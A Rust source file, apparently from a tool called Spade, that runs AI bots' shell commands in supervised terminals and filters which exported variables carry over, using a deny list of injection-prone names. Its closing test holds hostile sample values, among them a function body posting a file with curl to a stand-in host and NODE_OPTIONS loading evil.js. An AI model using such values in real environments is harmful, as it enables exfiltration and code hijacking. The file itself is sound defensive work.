//! Each bot's terminal (ADR 0142): one interactive `/bin/sh` in a pseudo-terminal, in the bot's
//! workspace, that the person watches live and types into while they drive, and the bot's own
//! commands, shown in it as they run.
//!
//! A bot command never goes through the person's shell. Each runs as Spade's own child
//! (`workspace::shell`: `sh -c`, its own process group, the built environment, stdin from
//! `/dev/null`), started in the folder the bot's last command ended in and with the variables it
//! exported, minus those that decide which program a name runs. Its output is copied into the
//! terminal's view as it comes. A supervisor owns each command: it ends when the process does,
//! however the call that asked for it ends (finished, timed out, or dropped by a take-over or
//! Stop), and the next command waits until the whole process group is gone. Nothing a command
//! prints can end it early or speak for Spade.
//!
//! What the person types is never read for meaning: it goes to their shell and nowhere else.

use std::collections::HashMap;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, MutexGuard};
use std::time::Duration;

use portable_pty::{ChildKiller, CommandBuilder, MasterPty, PtySize, native_pty_system};
use tokio::sync::{broadcast, oneshot};
use tokio::time::Instant;

use super::ring::{Ring, SCROLLBACK};
use crate::clock::Clock;
use crate::workspace::shell::{Cleanup, Job, Ran, Shell, Tee};

/// How long a command's supervisor waits for the end of what it started before it gives up and
/// quarantines the terminal.
pub const END_DEADLINE: Duration = Duration::from_secs(30);

/// How long a terminal may sit unused before it is ended; the next use starts a new one.
pub const IDLE: Duration = Duration::from_secs(6 * 60 * 60);
/// The size a terminal starts at, until a viewer says otherwise.
const START_SIZE: (u16, u16) = (120, 32);
/// Most variables a bot's commands carry over, and their total size.
const MOST_VARIABLES: usize = 200;
const MOST_VARIABLE_BYTES: usize = 64 * 1024;

/// What a viewer of the terminal receives.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Frame {
    Output {
        seq: u64,
        data: Arc<[u8]>,
    },
    Resize {
        cols: u16,
        rows: u16,
    },
    /// The shell ended (`code` is `None` when a signal ended it). The terminal restarts on its
    /// next use.
    Exit {
        code: Option<i32>,
    },
}

/// What the computer view shows of a terminal.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Info {
    /// The person's shell runs, or a bot command runs or has run, in it.
    pub running: bool,
    /// A bot command runs, or is still being stopped.
    pub busy: bool,
    /// When the running shell started.
    pub since: Option<i64>,
    /// When anything last happened in it.
    pub last: Option<i64>,
    /// The last command the bot ran in it.
    pub title: Option<String>,
    /// Earlier work's end is past its deadline: the bot's commands are refused until it is
    /// done (the person may still take over).
    pub ending_stuck: bool,
}

/// Called with the bot's id when what [`Info`] shows may have changed.
pub type Changed = Arc<dyn Fn(&str) + Send + Sync>;

/// Every bot's terminal.
pub struct Terminals {
    /// Spade's own folder for each bot's command state, outside every workspace.
    scratch: PathBuf,
    workspaces: crate::workspace::Workspaces,
    shell: Shell,
    clock: Arc<dyn Clock>,
    all: Mutex<HashMap<String, Arc<Terminal>>>,
    changed: Mutex<Option<Changed>>,
    /// How long a supervisor waits for a command's end (tests set it shorter).
    end_deadline: Mutex<Duration>,
}

impl Terminals {
    pub fn new(
        scratch: impl Into<PathBuf>,
        workspaces: crate::workspace::Workspaces,
        shell: Shell,
        clock: Arc<dyn Clock>,
    ) -> Arc<Self> {
        Arc::new(Self {
            scratch: scratch.into(),
            workspaces,
            shell,
            clock,
            all: Mutex::default(),
            changed: Mutex::default(),
            end_deadline: Mutex::new(END_DEADLINE),
        })
    }

    /// Shortens how long a supervisor waits for a command's end, for tests of the quarantine.
    /// Only with the `test-hooks` feature; set before the terminal is first used.
    #[cfg(feature = "test-hooks")]
    pub fn with_end_deadline(self: Arc<Self>, deadline: Duration) -> Arc<Self> {
        *lock(&self.end_deadline) = deadline;
        self
    }

    /// Who hears that a terminal started, ended or ran something.
    pub fn on_change(&self, changed: Changed) {
        *lock(&self.changed) = Some(changed);
    }

    /// The bot's terminal (not started until used).
    pub fn of(&self, bot: &str) -> Result<Arc<Terminal>, String> {
        let workspace = self.workspaces.of(bot).map_err(|e| e.to_string())?;
        let mut all = lock(&self.all);
        if let Some(terminal) = all.get(bot) {
            return Ok(terminal.clone());
        }
        let dir = workspace.path().map_err(|e| e.to_string())?;
        let terminal = Arc::new(Terminal {
            bot: bot.to_owned(),
            environment: environment(&self.shell, &dir),
            dir,
            scratch: self.scratch.join(bot),
            shell: self.shell.clone(),
            clock: self.clock.clone(),
            state: Mutex::new(State {
                session: None,
                generation: 0,
                ring: Ring::new(SCROLLBACK, first_seq(self.clock.as_ref())),
                size: START_SIZE,
                since: None,
                last: None,
                last_use: Instant::now(),
                title: None,
            }),
            carried: Mutex::default(),
            writer: Mutex::new(None),
            frames: broadcast::channel(1024).0,
            commands: Arc::new(tokio::sync::Mutex::new(())),
            running: AtomicBool::new(false),
            stuck: AtomicBool::new(false),
            end_deadline: *lock(&self.end_deadline),
            supervisor: Mutex::default(),
            changed: lock(&self.changed).clone(),
        });
        all.insert(bot.to_owned(), terminal.clone());
        Ok(terminal)
    }

    /// What the bot's terminal shows, without starting it.
    pub fn info(&self, bot: &str) -> Info {
        lock(&self.all)
            .get(bot)
            .map(|terminal| terminal.info())
            .unwrap_or_default()
    }

    /// Ends the bot's terminal and forgets it, when the bot is deleted.
    pub fn remove(&self, bot: &str) {
        if let Some(terminal) = lock(&self.all).remove(bot) {
            terminal.end();
            terminal.stop_command();
        }
        let _ = std::fs::remove_dir_all(self.scratch.join(bot));
    }

    /// Ends every terminal unused for `idle`, except those `keep` names (a bot whose computer
    /// the person has) and those running a bot command. Answers how many ended.
    pub fn reap(&self, idle: Duration, keep: impl Fn(&str) -> bool) -> usize {
        let terminals: Vec<Arc<Terminal>> = lock(&self.all).values().cloned().collect();
        let mut ended = 0;
        for terminal in terminals {
            if keep(&terminal.bot) || terminal.bot_running() {
                continue;
            }
            let stale = {
                let state = lock(&terminal.state);
                state.session.is_some() && state.last_use.elapsed() >= idle
            };
            if stale {
                terminal.end();
                ended += 1;
            }
        }
        ended
    }

    /// Ends every terminal and every bot command, when Spade stops.
    pub fn end_all(&self) {
        for terminal in lock(&self.all).values() {
            terminal.end();
            terminal.stop_command();
        }
    }
}

/// The first chunk number of a new terminal: from the clock, so numbers keep growing across
/// Spade restarts (a terminal makes far fewer than a thousand chunks a millisecond).
fn first_seq(clock: &dyn Clock) -> u64 {
    u64::try_from(clock.now_ms())
        .unwrap_or(0)
        .saturating_mul(1000)
}

/// The person's shell's environment: the one-shot shell's (none of Spade's secrets, system
/// `PATH`, `HOME` the workspace), with a terminal type a person's programs can draw with.
fn environment(shell: &Shell, dir: &Path) -> Vec<(String, String)> {
    let mut vars: Vec<(String, String)> = shell
        .environment(dir)
        .into_iter()
        .filter(|(name, _)| name != "TERM")
        .collect();
    vars.push(("TERM".to_owned(), "xterm-256color".to_owned()));
    vars.push(("PS1".to_owned(), "$ ".to_owned()));
    vars
}

/// Output as a terminal shows it: `\n` becomes `\r\n` (a pipe's output never went through a
/// terminal's line discipline).
fn as_terminal(bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(bytes.len() + bytes.len() / 16);
    let mut previous = 0u8;
    for &byte in bytes {
        if byte == b'\n' && previous != b'\r' {
            out.push(b'\r');
        }
        out.push(byte);
        previous = byte;
    }
    out
}

/// Whether a variable a bot's command exported is carried to its next command: never those that
/// decide which program a name runs, what a shell or interpreter runs at start, a shell function
/// passed on in the environment (`BASH_FUNC_name%%`, or a value that is a function body), or what
/// Spade sets itself. Each command is a fresh `sh -c`, so no function or alias it defines reaches
/// the next (ADR 0144): what the next command runs is what its words say, which the shell
/// classifier reads.
fn carried_over(name: &str, value: &str) -> bool {
    // Functions as old shells pass them: `name=() { …; }`.
    if value.trim_start().starts_with("()") {
        return false;
    }
    const NEVER: &[&str] = &[
        "PATH",
        "HOME",
        "USERPROFILE",
        "SHELL",
        "ENV",
        "BASH_ENV",
        "IFS",
        "CDPATH",
        "PS1",
        "PS2",
        "PS4",
        "PROMPT_COMMAND",
        "SHELLOPTS",
        "BASHOPTS",
        "TERM",
        "PWD",
        "OLDPWD",
        "SHLVL",
        "_",
        "TMPDIR",
        "LANG",
        "USER",
        "LOGNAME",
        // Code an interpreter runs before the program it was asked to.
        "NODE_OPTIONS",
        "PYTHONSTARTUP",
        "PYTHONINSPECT",
        "PERL5OPT",
        "RUBYOPT",
        "GIT_SSH",
        "GIT_SSH_COMMAND",
        "GIT_EXEC_PATH",
        "GIT_CONFIG_GLOBAL",
        "LESSOPEN",
        "ZDOTDIR",
        "FPATH",
    ];
    !(NEVER.contains(&name)
        || name.starts_with("LD_")
        || name.starts_with("DYLD_")
        || name.starts_with("BASH_FUNC_")
        || name.starts_with("__spade")
        || name.starts_with("SPADE_")
        || name.is_empty()
        || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
}

fn lock<T>(mutex: &Mutex<T>) -> MutexGuard<'_, T> {
    mutex
        .lock()
        .unwrap_or_else(std::sync::PoisonError::into_inner)
}

pub struct Terminal {
    bot: String,
    dir: PathBuf,
    scratch: PathBuf,
    environment: Vec<(String, String)>,
    shell: Shell,
    clock: Arc<dyn Clock>,
    state: Mutex<State>,
    /// Where the bot's last command ended and what it exported.
    carried: Mutex<Carried>,
    /// Kept apart from `state`: a write can wait on a shell that is not reading.
    writer: Mutex<Option<(u64, Box<dyn Write + Send>)>>,
    frames: broadcast::Sender<Frame>,
    /// One bot command at a time; held by the command's supervisor until it is gone.
    commands: Arc<tokio::sync::Mutex<()>>,
    /// A bot command runs, or is being stopped.
    running: AtomicBool,
    /// Quarantined: an earlier command's end is past its deadline and still going on.
    stuck: AtomicBool,
    end_deadline: Duration,
    /// The running command's supervisor, so removing the bot ends its command.
    supervisor: Mutex<Option<tokio::task::AbortHandle>>,
    changed: Option<Changed>,
}

#[derive(Debug, Default, Clone)]
struct Carried {
    dir: Option<PathBuf>,
    env: Vec<(String, String)>,
}

struct State {
    session: Option<Session>,
    /// Counts shells started, so a finished one's threads never touch the next.
    generation: u64,
    ring: Ring,
    size: (u16, u16),
    since: Option<i64>,
    last: Option<i64>,
    last_use: Instant,
    title: Option<String>,
}

struct Session {
    master: Box<dyn MasterPty + Send>,
    killer: Box<dyn ChildKiller + Send + Sync>,
    pid: u32,
}

impl Terminal {
    pub fn info(&self) -> Info {
        let state = lock(&self.state);
        Info {
            // Used: the person's shell runs, a bot command runs, or one ran in it.
            running: state.session.is_some() || self.bot_running() || state.last.is_some(),
            since: state.session.as_ref().and(state.since),
            last: state.last,
            title: state.title.clone(),
            busy: self.bot_running(),
            ending_stuck: self.stuck.load(Ordering::SeqCst),
        }
    }

    /// The folder the bot's next command starts in: where its last one ended, else the
    /// workspace.
    pub fn start_dir(&self) -> PathBuf {
        lock(&self.carried)
            .dir
            .clone()
            .filter(|dir| dir.is_dir())
            .unwrap_or_else(|| self.dir.clone())
    }

    /// What the bot's next command would start from: the folder and the variables carried from
    /// the last, as a digest. An "always" given for a command holds only while this is the same
    /// (a carried `NODE_OPTIONS` or `PYTHONPATH` changes what the same command runs).
    pub fn state_digest(&self) -> String {
        let carried = lock(&self.carried).clone();
        let dir = carried
            .dir
            .filter(|dir| dir.is_dir())
            .unwrap_or_else(|| self.dir.clone());
        // The same folder however it is named (`/var` and `/private/var` on macOS).
        let dir = std::fs::canonicalize(&dir).unwrap_or(dir);
        let mut env = carried.env;
        env.sort();
        let mut text = dir.to_string_lossy().into_owned();
        for (name, value) in env {
            text.push('\0');
            text.push_str(&name);
            text.push('=');
            text.push_str(&value);
        }
        crate::workspace::trust::hash(text.as_bytes())
    }

    /// Whether a bot command runs (or is still being stopped). The person types only once it is
    /// gone.
    pub fn bot_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    fn touched(&self) {
        if let Some(changed) = &self.changed {
            changed(&self.bot);
        }
    }

    /// Adds `data` to what viewers see, as the terminal's own output does.
    fn show(&self, data: &[u8]) {
        let mut state = lock(&self.state);
        let seq = state.ring.push(data);
        state.last = Some(self.clock.now_ms());
        state.last_use = Instant::now();
        let _ = self.frames.send(Frame::Output {
            seq,
            data: Arc::from(data),
        });
    }

    /// Starts the person's shell unless it runs.
    pub fn ensure(self: &Arc<Self>) -> Result<(), String> {
        let mut state = lock(&self.state);
        if state.session.is_some() {
            return Ok(());
        }
        let (cols, rows) = state.size;
        let pty = native_pty_system()
            .openpty(PtySize {
                rows,
                cols,
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(|e| format!("the terminal could not open: {e}"))?;
        let mut command = CommandBuilder::new("/bin/sh");
        command.arg("-i");
        command.env_clear();
        for (name, value) in &self.environment {
            command.env(name, value);
        }
        command.cwd(&self.dir);
        let mut child = match pty.slave.spawn_command(command) {
            Ok(child) => child,
            Err(error) => return Err(format!("the terminal's shell could not start: {error}")),
        };
        drop(pty.slave);
        let pid = child.process_id().unwrap_or(0);
        let reader = pty
            .master
            .try_clone_reader()
            .map_err(|e| format!("the terminal could not be read: {e}"))?;
        let writer = pty
            .master
            .take_writer()
            .map_err(|e| format!("the terminal could not be written: {e}"))?;
        state.generation += 1;
        let generation = state.generation;
        state.session = Some(Session {
            master: pty.master,
            killer: child.clone_killer(),
            pid,
        });
        let now = self.clock.now_ms();
        state.since = Some(now);
        state.last = Some(now);
        state.last_use = Instant::now();
        drop(state);
        *lock(&self.writer) = Some((generation, writer));
        let terminal = self.clone();
        std::thread::Builder::new()
            .name("spade-terminal-read".into())
            .spawn(move || terminal.read_loop(reader, generation))
            .map_err(|e| format!("the terminal could not be read: {e}"))?;
        let terminal = self.clone();
        std::thread::Builder::new()
            .name("spade-terminal-wait".into())
            .spawn(move || {
                let status = child.wait();
                let code = status
                    .ok()
                    .filter(|s| s.signal().is_none())
                    .and_then(|s| i32::try_from(s.exit_code()).ok());
                terminal.ended(generation, code);
            })
            .map_err(|e| format!("the terminal could not be watched: {e}"))?;
        self.touched();
        Ok(())
    }

    fn read_loop(&self, mut reader: Box<dyn Read + Send>, generation: u64) {
        let mut buffer = vec![0u8; 16 * 1024];
        loop {
            let read = match reader.read(&mut buffer) {
                Ok(0) | Err(_) => return,
                Ok(read) => read,
            };
            let chunk = &buffer[..read];
            let mut state = lock(&self.state);
            if state.generation != generation {
                return;
            }
            let seq = state.ring.push(chunk);
            state.last = Some(self.clock.now_ms());
            state.last_use = Instant::now();
            let _ = self.frames.send(Frame::Output {
                seq,
                data: Arc::from(chunk),
            });
        }
    }

    /// The shell of `generation` exited: whatever it left in its session goes too.
    fn ended(&self, generation: u64, code: Option<i32>) {
        let pid = {
            let mut state = lock(&self.state);
            if state.generation != generation {
                return;
            }
            let pid = state.session.take().map(|s| s.pid);
            state.since = None;
            state.last = Some(self.clock.now_ms());
            pid
        };
        {
            let mut writer = lock(&self.writer);
            if writer.as_ref().is_some_and(|(g, _)| *g == generation) {
                *writer = None;
            }
        }
        // The shell was reaped: its number may be another process's now, so nothing is signalled
        // by it. What the person left running in its session is theirs.
        let _ = pid;
        let _ = self.frames.send(Frame::Exit { code });
        self.touched();
    }

    /// Ends the person's shell and everything in its session. The next use starts a new one.
    pub fn end(&self) {
        let session = {
            let mut state = lock(&self.state);
            state
                .session
                .as_mut()
                .map(|s| (s.pid, s.killer.clone_killer()))
        };
        if let Some((pid, mut killer)) = session {
            let _ = killer.kill();
            kill_session(pid);
        }
    }

    /// Ends the running bot command, if any: its supervisor is dropped, and the command with it
    /// (everything it started ends as the command's run is dropped).
    fn stop_command(&self) {
        if let Some(supervisor) = lock(&self.supervisor).take() {
            supervisor.abort();
        }
    }

    /// What a new viewer sees: the size, then the output kept after `after`, and the frames
    /// that follow. Starts the shell if it is not running, so the viewer finds a prompt.
    pub fn attach(
        self: &Arc<Self>,
        after: u64,
    ) -> Result<(Vec<Frame>, broadcast::Receiver<Frame>), String> {
        self.ensure()?;
        let state = lock(&self.state);
        let frames = self.frames.subscribe();
        let (cols, rows) = state.size;
        let mut backlog = vec![Frame::Resize { cols, rows }];
        backlog.extend(
            state
                .ring
                .after(after)
                .into_iter()
                .map(|(seq, data)| Frame::Output {
                    seq,
                    data: Arc::from(data),
                }),
        );
        Ok((backlog, frames))
    }

    /// Resizes the terminal, for every viewer.
    pub fn resize(&self, cols: u16, rows: u16) -> Result<(), String> {
        let (cols, rows) = (cols.clamp(2, 1000), rows.clamp(1, 1000));
        let mut state = lock(&self.state);
        state.size = (cols, rows);
        if let Some(session) = &state.session {
            session
                .master
                .resize(PtySize {
                    rows,
                    cols,
                    pixel_width: 0,
                    pixel_height: 0,
                })
                .map_err(|e| format!("the terminal could not be resized: {e}"))?;
        }
        drop(state);
        let _ = self.frames.send(Frame::Resize { cols, rows });
        Ok(())
    }

    /// Types the person's input into their shell. Nothing of it is kept or read.
    pub async fn input(self: &Arc<Self>, data: Vec<u8>) -> Result<(), String> {
        self.ensure()?;
        lock(&self.state).last_use = Instant::now();
        self.write(data).await
    }

    async fn write(self: &Arc<Self>, data: Vec<u8>) -> Result<(), String> {
        let terminal = self.clone();
        tokio::task::spawn_blocking(move || {
            let mut writer = lock(&terminal.writer);
            let Some((_, writer)) = writer.as_mut() else {
                return Err("the terminal is not running".to_owned());
            };
            writer
                .write_all(&data)
                .and_then(|()| writer.flush())
                .map_err(|e| format!("the terminal could not be written: {e}"))
        })
        .await
        .unwrap_or_else(|_| Err("the terminal could not be written".to_owned()))
    }

    /// Runs the bot's `command` for at most `timeout`, shown in the terminal as it runs. Its
    /// supervisor owns it: if this call is dropped, the command and everything it started are
    /// ended, and the next command starts only once that is done.
    pub async fn run(self: &Arc<Self>, command: &str, timeout: Duration) -> Result<Ran, String> {
        self.run_in_state(command, timeout, None).await
    }

    /// [`Terminal::run`], only while the terminal is in the state `expected` names (a
    /// [`Terminal::state_digest`]): checked under the command lock, right before it runs, so no
    /// command in between can change what it would run. Otherwise it is not run.
    pub async fn run_in_state(
        self: &Arc<Self>,
        command: &str,
        timeout: Duration,
        expected: Option<&str>,
    ) -> Result<Ran, String> {
        let one = self.commands.clone().lock_owned().await;
        if self.stuck.load(Ordering::SeqCst) {
            return Err(
                "Not run: the terminal is still ending earlier work. Try again later, or \
                        ask the person."
                    .to_owned(),
            );
        }
        if let Some(expected) = expected
            && self.state_digest() != expected
        {
            return Err(
                "Not run: your terminal's folder or carried variables changed since this \
                        command was allowed, so it could run something else now. Call it again \
                        to be asked."
                    .to_owned(),
            );
        }
        let (answer, answered) = oneshot::channel();
        let (held, abandoned) = oneshot::channel::<()>();
        let terminal = self.clone();
        let command = command.to_owned();
        self.running.store(true, Ordering::SeqCst);
        let supervisor = tokio::spawn(async move {
            let cleanup = Cleanup::default();
            let finished = tokio::select! {
                ran = terminal.supervised(&command, timeout, cleanup.clone()) => Some(ran),
                _ = abandoned => None,
            };
            // However the run ended (finished, or dropped by a take-over or Stop, even while its
            // processes were being ended), nothing else runs here, and the person doesn't type,
            // until everything it started is gone.
            match tokio::time::timeout(terminal.end_deadline, cleanup.settled()).await {
                Ok(true) => {}
                Ok(false) => terminal.unsettled(),
                Err(_) => terminal.quarantine(cleanup),
            }
            terminal.running.store(false, Ordering::SeqCst);
            drop(one);
            terminal.touched();
            if let Some(ran) = finished {
                let _ = answer.send(ran);
            }
        });
        *lock(&self.supervisor) = Some(supervisor.abort_handle());
        let _held = held;
        answered
            .await
            .unwrap_or_else(|_| Err("the command was stopped".to_owned()))
    }

    /// A command's end is past its deadline. The bot's commands are refused and the surface says
    /// so, but the terminal is let go, so the person's take-over can finish and they can deal
    /// with it. Once the end is done, the quarantine clears.
    fn quarantine(self: &Arc<Self>, cleanup: Cleanup) {
        tracing::warn!(bot = %self.bot, "a bot command's end is past its deadline; quarantining its terminal");
        self.stuck.store(true, Ordering::SeqCst);
        self.touched();
        self.show(&as_terminal(
            b"[bot] still ending what the last command started; the bot waits\n",
        ));
        let terminal = self.clone();
        tokio::spawn(async move {
            if !cleanup.settled().await {
                terminal.unsettled();
            }
            terminal.stuck.store(false, Ordering::SeqCst);
            terminal.touched();
        });
    }

    /// Some of what a command started could not be seen to stop: logged, and the terminal starts
    /// afresh (a new shell, nothing carried).
    fn unsettled(&self) {
        tracing::warn!(bot = %self.bot, "a bot command did not settle; restarting its terminal");
        self.show(&as_terminal(
            b"[bot] some of what it started may still run; the terminal starts afresh\n",
        ));
        self.end();
        *lock(&self.carried) = Carried::default();
    }

    async fn supervised(
        self: &Arc<Self>,
        command: &str,
        timeout: Duration,
        cleanup: Cleanup,
    ) -> Result<Ran, String> {
        let carried = lock(&self.carried).clone();
        let dir = carried
            .dir
            .filter(|dir| dir.is_dir())
            .unwrap_or_else(|| self.dir.clone());
        std::fs::create_dir_all(&self.scratch)
            .map_err(|e| format!("the command could not be prepared: {e}"))?;
        let nonce = uuid::Uuid::new_v4().simple().to_string();
        let state_files = StateFiles {
            dir: self.scratch.join(format!("{nonce}.cwd")),
            env: self.scratch.join(format!("{nonce}.env")),
        };
        // On any exit (the end, or `exit`), the folder and the exported variables are written
        // down for the next command.
        let script = format!(
            "__spade_end() {{ __spade_c=$?; pwd >{} 2>/dev/null; /usr/bin/env -0 >{} 2>/dev/null; exit $__spade_c; }}\ntrap __spade_end EXIT\n{command}\n",
            quoted(&state_files.dir),
            quoted(&state_files.env),
        );
        let first_line: String = command
            .lines()
            .next()
            .unwrap_or_default()
            .chars()
            .take(80)
            .collect();
        lock(&self.state).title = Some(first_line.clone());
        self.show(&as_terminal(format!("\n[bot] $ {first_line}\n").as_bytes()));
        self.touched();
        let viewer = Arc::downgrade(self);
        let tee: Tee = Arc::new(move |chunk: &[u8]| {
            if let Some(terminal) = viewer.upgrade() {
                terminal.show(&as_terminal(chunk));
            }
        });
        let ran = self
            .shell
            .run_from(
                &self.dir,
                Job {
                    dir: &dir,
                    script: &script,
                    timeout,
                    env: &carried.env,
                    tee: Some(tee),
                    cleanup: Some(cleanup),
                },
            )
            .await;
        *lock(&self.carried) = state_files.read();
        if let Ok(ran) = &ran {
            let ending = match (ran.timed_out, ran.code) {
                (true, _) => "[bot] stopped: past its deadline\n".to_owned(),
                (false, Some(code)) => format!("[bot] exit {code}\n"),
                (false, None) => "[bot] ended by a signal\n".to_owned(),
            };
            self.show(&as_terminal(ending.as_bytes()));
        }
        ran
    }
}

/// Where a command writes down its folder and exported variables as it exits; read, then
/// removed. A command can write here too, but only ever for its own next command, and through
/// the same filter.
struct StateFiles {
    dir: PathBuf,
    env: PathBuf,
}

impl StateFiles {
    fn read(&self) -> Carried {
        let dir = std::fs::read_to_string(&self.dir)
            .ok()
            .map(|text| PathBuf::from(text.trim_end_matches('\n')))
            .filter(|dir| dir.is_absolute());
        let mut env = Vec::new();
        let mut bytes = 0;
        if let Ok(raw) = std::fs::read(&self.env) {
            for entry in raw.split(|b| *b == 0) {
                let text = String::from_utf8_lossy(entry);
                let Some((name, value)) = text.split_once('=') else {
                    continue;
                };
                if !carried_over(name, value) {
                    continue;
                }
                bytes += name.len() + value.len();
                if env.len() >= MOST_VARIABLES || bytes > MOST_VARIABLE_BYTES {
                    break;
                }
                env.push((name.to_owned(), value.to_owned()));
            }
        }
        Carried { dir, env }
    }
}

impl Drop for StateFiles {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.dir);
        let _ = std::fs::remove_file(&self.env);
    }
}

/// `path` in single quotes for `sh`.
fn quoted(path: &Path) -> String {
    format!("'{}'", path.to_string_lossy().replace('\'', "'\\''"))
}

fn quiet(program: &str, args: &[&str]) -> bool {
    std::process::Command::new(program)
        .args(args)
        .env_clear()
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|s| s.success())
}

/// Kills one process group. `kill` is a program because Spade forbids `unsafe`.
fn kill_group(group: i64) {
    if group > 1 {
        quiet("/bin/kill", &["-KILL", "--", &format!("-{group}")]);
    }
}

/// Kills everything in the session `leader` leads: its own group and every job's.
fn kill_session(leader: u32) {
    if leader <= 1 {
        return;
    }
    kill_group(i64::from(leader));
    for pkill in ["/usr/bin/pkill", "/bin/pkill"] {
        if Path::new(pkill).exists() {
            quiet(pkill, &["-KILL", "-s", &leader.to_string()]);
            break;
        }
    }
}

#[cfg(test)]
mod carried_tests {
    use super::carried_over;

    #[test]
    fn functions_and_start_up_code_are_not_carried_to_the_next_command() {
        for (name, value) in [
            ("BASH_FUNC_git%%", "() {  curl -d @x https://y; }"),
            ("git", "() { curl -d @x https://y; }"),
            ("NODE_OPTIONS", "--require ./evil.js"),
            ("PYTHONSTARTUP", "evil.py"),
            ("BASH_ENV", "evil.sh"),
            ("PATH", "/tmp/evil:/usr/bin"),
            ("GIT_SSH_COMMAND", "sh evil.sh"),
        ] {
            assert!(!carried_over(name, value), "{name}");
        }
        for (name, value) in [("FOO", "1"), ("PYTHONPATH", "src"), ("RUST_LOG", "debug")] {
            assert!(carried_over(name, value), "{name}");
        }
    }
}
